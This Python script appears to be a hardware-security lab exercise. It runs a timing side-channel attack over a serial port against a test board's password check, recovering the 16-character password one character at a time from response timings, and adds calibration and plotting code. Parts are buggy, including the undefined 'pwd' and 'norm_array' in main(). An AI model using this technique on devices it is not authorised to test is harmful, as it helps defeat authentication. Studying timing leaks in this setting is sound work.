#!/usr/bin/env python3

import serial
import time
import sys
import re
import pdb
import string
import os
import traceback
import itertools
from enum import Enum
import numpy as np
from string import digits, ascii_letters, punctuation
from sklearn.linear_model import LinearRegression
import matplotlib.pyplot as plt

np.set_printoptions(linewidth=100, precision=6)

# Open the serial port
ser = serial.Serial('/dev/ttyUSB1', baudrate=115200)


class Command(Enum):
    SET_PWD = 's'
    GET_PWD = 'g'
    SEND_PWD = 'p'
    RESET = chr(27)


def pwd_failed() -> bool:
    r = b"Please enter the Password:\r\n\x00"
    tty_resp = ser.read(len(r))
    m = b"Password Incorrect.\r\n\x00"
    tty_resp = ser.read(len(m))
    if m == tty_resp:
        return True
    print(f"tty_resp: {tty_resp}")
    return False


def send_reset():
    # print("Resetting board.")
    ser.write(chr(27).encode("ascii"))


def reset():
    send_reset()

    m = b"Please enter the Password:\r\n\x00"
    tty_resp = ser.read(len(m))

    if m != tty_resp:
        raise Exception(f"Failed to reset board, res: '{tty_resp}'")


def send_command(cmd: Command, pwd: str = None):
    s = cmd.value.encode("ascii")
    # print(f"Sending {s}")
    num = ser.write(s)
    if num != 1:
        raise Exception("Failed sending full password")

    if cmd == Command.SEND_PWD and pwd != None:
        raise Exception("Send pwd should not have a password as argument")

    if pwd and cmd == Command.SET_PWD:
        s = pwd.encode("ascii")
        # print(f"Sending {s}")
        num = ser.write(s)
        if num != 16:
            raise Exception("Failed sending full password")

    if cmd == Command.GET_PWD:
        res = ser.read(16)
        return res.decode("ascii")

    return None


def normalize_array(arr):
    arr = np.array(arr)
    normalized_arr = arr / np.linalg.norm(arr, ord=1)
    return normalized_arr

def convert_ns_to_us(ns_array):
    ns_array = np.array(ns_array, dtype=np.float64)
    ms_array = ns_array / 1_000
    return ms_array

def set_delay(delay: int): # delay in cycles
    d = 'D'.encode("ascii")
    num = ser.write(d)
    if num != 1:
        raise Exception("Failed sending 'D'")
    d = 'd'.encode("ascii")
    for i in range(delay):
        num = ser.write(d)
        if num != 1:
            raise Exception("Failed sending 'd'")
    print(f"Delaying for {delay*100} us")


# Returns time in nanoseconds
def get_time():
    d = 't'.encode("ascii")
    num = ser.write(d)
    if num != 1:
        raise Exception("Failed sending 't'")
    tags = ser.read_until(b'!').decode()
    hash_count = tags.count('#')*100
    dot_count = tags.count('.')*1
    plus_count = tags.count('+')*10

    return hash_count + dot_count + plus_count



def test_window():
    # r = 80
    # var_arr = np.zeros((r, r))
    # for i in range(r):
    #     variance = generate_graph(i)
    #     var_arr[0][i] = variance
    #     var_arr[1][i] = i
    generate_graph(0, True)
    # print(var_arr)
    # x = var_arr[1]
    # y = var_arr[0]
    # plt.clf()
    # plt.plot(x,y, 'o-')
    # plt.savefig(f"mygraph_delays.png")


def generate_graph(delay, plot=False):
    plt.clf()
    CHARS = digits + ascii_letters + punctuation
    PWD_ARR = ['0' for i in range(16)]
    arr_diff_2 = np.zeros((2, len(CHARS)), dtype=np.int64)

    set_delay(delay)
    pwd_str = "".join(PWD_ARR)
    send_command(Command.SET_PWD, pwd_str)
    time.sleep(0.1)

    while True:
        for i in range(len(arr_diff_2[0])):

            send_command(Command.SEND_PWD)
            if not pwd_failed():
                raise Exception("Password was correct")
            dtime = get_time()
            arr_diff_2[0][i] = dtime
            arr_diff_2[1][i] = time.perf_counter_ns()

        print(arr_diff_2[0])
        y = arr_diff_2[0].copy()
        y -= y.min()
        print(y)
        print(f"Variance: {np.var(arr_diff_2[0])}")
        delay += 1
        set_delay(delay)

        if np.var(arr_diff_2[0]) == 0:
            print("===============FOUND IT=================")
            break

    # Linear regression on the data
    #x = arr_diff_2[1].reshape(-1, 1)
    #y = arr_diff_2[0].reshape(-1, 1)
    #model = LinearRegression()
    #model.fit(x, y)
    #r_sq = model.score(x, y)
    #print('coefficient of determination:', r_sq)
    #print('intercept:', model.intercept_)
    #print('slope:', model.coef_)
    #y_pred = model.predict(x)
    #print('predicted response:', y_pred, sep='')

    # Set x axis to 0 and milliseconds
    #arr_diff_2[1] -= arr_diff_2[1][0]
    x =  arr_diff_2[1].copy()
    x -= arr_diff_2[1].min()
    x =  convert_ns_to_us(convert_ns_to_us(x))
    x =  x.astype(np.int64)

    # Set y axis to milliseconds
    y = arr_diff_2[0].copy()
    y -= y.min()
    #y = convert_ns_to_us(y)


    #coeffs = np.empty(arr_diff_2.shape[0])
    #for i, row in enumerate(arr_diff_2):
    #    coeffs[i] = LinearRegression().fit(row[:, None], range(len(row))).coef_
    #print(coeffs)

    print(y)

    # Print statistics
    variance = np.var(y)
    mean = np.mean(y)
    std = np.std(y)
    median = np.median(y)
    print(f"Variance: {variance}")
    print(f"Mean: {mean} us")
    print(f"Median: {median} us")
    print(f"Max: {arr_diff_2[0].max() / 1_000_000} ms")
    print(f"Min: {arr_diff_2[0].min() / 1_000_000} ms")

    if plot:
        # Create plot
        plt.text(0.8, 0.9, f'Mean: {mean:.2f}', transform=plt.gca().transAxes)
        plt.text(0.8, 0.85, f'Variance: {variance:.2f}', transform=plt.gca().transAxes)
        plt.ylabel("Time difference (us)")
        plt.xlabel("Time (ms)")
        plt.title(f"Time difference between password attempts over time. Delay: {delay*10} us")
        #plt.xticks(range(min(x), max(x)+1, max(x).astype(int) / 20) )
        plt.plot(x,y, 'o-')
        plt.savefig(f"mygraph_{delay}.png")

    return variance


def main():
    # ============== Main ==============

    # Init global variables
    CHARS = digits + ascii_letters + punctuation
    PWD_ARR = [CHARS[0] for i in range(16)]

    # Initialize arrays
    arr_diff = np.zeros((16, len(CHARS)), dtype=np.int32)
    prev_i = 0


    reset()
    pwd_temp = send_command(Command.GET_PWD)
    if pwd_temp != "ABCDEFGHIJKLMNOP":
        print(f"Password is not default. Is '{pwd_temp}'")

    try:
        for pwd_i in range(16):
            for (c_i, c) in enumerate(CHARS):
                PWD_ARR[pwd_i] = c

                # If we jumped to next password index
                if prev_i != pwd_i:

                    # Find character with highest time
                    max_index = np.argmax(arr_diff[prev_i])
                    sol_char = CHARS[max_index]

                    # Set previous index character to character with highest time
                    PWD_ARR[prev_i] = sol_char

                    #if pwd_i == 3:
                    #    raise KeyboardInterrupt()

                pwd_str = "".join(PWD_ARR)
                print(f"Cracking password: {pwd_str} pwd_i: {pwd_i} c_i: {c_i}")
                send_command(Command.SET_PWD, pwd_str)

                start = time.perf_counter_ns()
                send_command(Command.SEND_PWD)

                if pwd_failed():
                    arr_diff[pwd_i][c_i] = get_time()
                    os.system('clear')
                else:
                    print(f"====== Password is '{pwd}' ==========")
                    break
                prev_i = pwd_i
    except KeyboardInterrupt:
        print("Exiting")


    for i in range(prev_i +1):
        print("="*10 +  f"[{i}]" + "="*10)
        print(f"{arr_diff[i]}")
        print(f"[{i}]: Variance: {np.var(arr_diff[i])}")
        print(f"[{i}]: Normalized Variance: {np.var(norm_array[i])}")


    # Close the serial port
    ser.close()



if __name__ == "__main__":
    try:
        #main()
        test_window()
    except Exception as ex:
        extype, value, tb = sys.exc_info()
        traceback.print_exc()
        pdb.post_mortem(tb) 